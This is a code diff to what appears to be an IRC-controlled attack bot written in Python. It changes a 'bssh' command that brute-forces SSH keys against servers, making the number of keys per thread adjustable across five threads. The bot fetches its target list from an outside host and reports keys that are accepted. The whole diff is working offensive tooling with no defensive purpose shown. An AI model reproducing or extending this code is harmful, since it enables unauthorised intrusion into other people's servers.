@@ -271,13 +271,13 @@ class Bot:
 		if (cmd == 'bssh'):
 			if not self.check_owner(source, place):
 				return
-			if not self.check_args(args, 1, place):
+			if not self.check_args(args, 2, place):
 				return
 
-			t = Thread(target=self.bssh, args=(args[0], place,))
+			t = Thread(target=self.bssh, args=(args[0], args[1], place,))
 			self.add_jobs('bssh', [t])
 			t.start()
-			self.printayne('bruteforcing ssh {0}'.format(args[0]), [place])
+			self.printayne('bruteforcing ssh {0}.. {1} keys per thread (5 threads)'.format(args[0], args[1]), [place])
 
 		if not self.LOL:
 			return
@@ -380,7 +380,7 @@ class Bot:
 				self.printayne('ssh {0} KEY {1} ACCEPTED'.format(target, k), [place])
 		self.pop_job('bssh')
 
-	def bssh(self, url, place):
+	def bssh(self, url, kpt, place):
 		try:
 			web_file = urllib2.urlopen('http://www.huelol.com/ssh/all')
 			sshs = web_file.readlines()
@@ -396,7 +396,8 @@ class Bot:
 				self.printayne('bssh now bruting {0}'.format(ssh), [place])
 				ts = []
 				for i in range(5):
-					t = Thread(target=self.bssh_r, args=(ssh_cli, ssh.strip('\r\n'), keys[i*600:i*600+600], place,))
+					kpt = int(kpt)
+					t = Thread(target=self.bssh_r, args=(ssh_cli, ssh.strip('\r\n'), keys[i*kpt:i*kpt+kpt], place,))
 					self.add_jobs('bssh', [t])
 					t.start()
 					ts.append(t)
